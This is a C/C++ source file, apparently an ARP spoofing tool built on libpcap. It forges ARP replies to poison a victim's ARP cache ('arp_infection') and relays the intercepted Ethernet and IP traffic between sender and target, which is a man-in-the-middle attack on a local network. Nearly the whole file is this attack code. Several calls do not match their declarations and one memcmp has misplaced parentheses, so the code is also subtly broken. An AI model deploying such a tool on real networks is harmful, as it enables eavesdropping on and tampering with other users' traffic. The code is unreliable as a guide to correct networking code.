#include "arp_spoof.h"

void get_my_ip(char * interface) {
	struct ifreq ifr;
	struct sockaddr_in * sin;
	uint32_t s;

	s = socket(AF_INET, SOCK_DGRAM, 0);
	strncpy(ifr.ifr_name, interface, IFNAMSIZ);

	if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
		printf("Error0\n");
		close(s);
		exit(1);
  } 
	else {
		sin = (struct sockaddr_in *)&ifr.ifr_addr;
  	memcpy(my_ip, (void*)&sin->sin_addr, sizeof(sin->sin_addr));
		close(s);
  }
}

void get_my_mac(char * interface) {
	int sock;
	struct ifreq ifr;
	char mac_adr[18] = {0,};

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0)	{
		printf("ERROR1\n");
		exit(1);
	}
	strcpy(ifr.ifr_name, interface);

	if (ioctl(sock, SIOCGIFHWADDR, &ifr)< 0) {
		printf("ERROR1\n");
		close(sock);
		exit(1);
	}
	
	memcpy(my_mac, (struct ether_addr *)(ifr.ifr_hwaddr.sa_data), 6);
	close(sock);
}

void send_pkt(uint8_t * d_mac, uint8_t * s_mac, uint8_t * f_mac, uint8_t * d_ip, uint8_t * s_ip, uint16_t arp_operand) {
	ether_header ether;
	arp_header arp;
	int ether_len = sizeof(struct ether_header);
	int arp_len = sizeof(struct arp_header);
	uint8_t * send = NULL;
	send = (uint8_t *)malloc(ether_len + arp_len);
	memcpy(ether.ether_dhost, d_mac, 6);
	memcpy(ether.ether_shost, s_mac, 6);
	ether.ether_type = static_cast<uint16_t>(0x0608);
  arp.arp_hrd = static_cast<uint16_t>(0x0100);
	arp.arp_pro = static_cast<uint16_t>(0x0008);
	arp.arp_hln = static_cast<uint8_t>(6);
	arp.arp_pln = static_cast<uint8_t>(4);
	arp.arp_op = arp_operand;
	memcpy(arp.arp_sha, s_mac, 6);
	memcpy(arp.arp_spa, s_ip, 4);
	memcpy(arp.arp_tha, f_mac, 6);
	memcpy(arp.arp_tpa, d_ip, 4);
	memcpy(send, &ether, ether_len);
	memcpy(send + ether_len, &arp, arp_len);
	if (pcap_sendpacket(fp, send, arp_len + ether_len) != 0) {
		printf("ERROR2\n");
		exit(1);
	}
}
		
void get_sender_mac(uint8_t * sender_mac, uint8_t * sender_ip) {
	struct pcap_pkthdr * header;
	struct ether_header * ethernet;
	struct arp_header * arp;
	const u_char * packet;
	uint8_t tmp_mac[6] = {static_cast<uint8_t>(0xff), static_cast<uint8_t>(0xff), static_cast<uint8_t>(0xff), static_cast<uint8_t>(0xff), static_cast<uint8_t>(0xff), static_cast<uint8_t>(0xff)};
	uint8_t tmp1_mac[6] = {0};
	send_pkt(tmp_mac, my_mac, tmp1_mac, sender_ip, my_ip, static_cast<uint16_t>(0x0100), fp);
	while (true) {
		int i, res = pcap_next_ex(fp, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2) break;
		ethernet = (struct ether_header *)(packet);
		if ((memcmp(ethernet -> ether_dhost, my_mac, 6) == 0) && (ethernet -> ether_type == static_cast<uint16_t>(0x0608))) {
			memcpy(sender_mac, ethernet -> ether_shost, 6);
			break;
		}
	}
}

void arp_infection(session s) {
	send_pkt(ip2mac[s.sender_ip], my_mac, ip2mac[s.sender_ip], s.target_ip, static_cast<uint16_t>(0x0200), fp);
}

void pkt_relay_recover(unsigned char *param,const struct pcap_pkthdr *header,const unsigned char *pkt_data)
{
  struct ether_header * ethernet = (struct ether_header *)pkt_data;
  for(int i = 0; i < session_cnt; i++) {
  	if((!memcmp(ip2mac[ip_vector[i].sender_ip], ethernet -> ether_shost, 6)) && (!memcmp(my_mac, ethernet -> ether_dhost, 6))) {
  		if(ethernet -> ether_type == htons(0x0800)) {
				memcpy(ethernet -> ether_shost, my_mac, 6);
				memcpy(ethernet -> ether_dhost, ip2mac[ip_vector[i].target_ip], 6);
			}
			else if(ethernet -> ether_type == htons(0x0806)) {
				struct arp_header * arp = (struct arp_header *)(pkt_data + 14);
				if((arp -> op == htons(0x0001)) && (!memcmp(arp -> tpa), (uint8_t*)&ip_vector[i].target_ip, 4)))
					arp_infection(ip_vector[i]);
			}
			break;
		} 
		else if((!memcmp(ip2mac[ip_vector[i].target_ip], ethernet -> ether_shost, 6)) && (!memcmp(my_mac, ethernet -> ether_dhost, 6))) {
			if(ethernet -> ether_type == htons(0x0800)) {
  			struct ip_header * ip = (struct ip_header *)(pkt_data + 14);	
				if(ip -> ip_dst == ip_vector[i].sender_ip) {
					memcpy(ethernet -> ether_shost, my_mac, 6);
					memcpy(ethernet -> ether_dhost, ip2mac[ip_vector[i].sender_ip], 6);
				}
			}
			break;
		}
	}
	pcap_sendpacket(fp, pkt_data, header->caplen);
}
	
void add_to_num(char * address, uint8_t * ip) {
	uint32_t tmp = inet_addr(address);
	memcpy(ip, &tmp, 4);
}
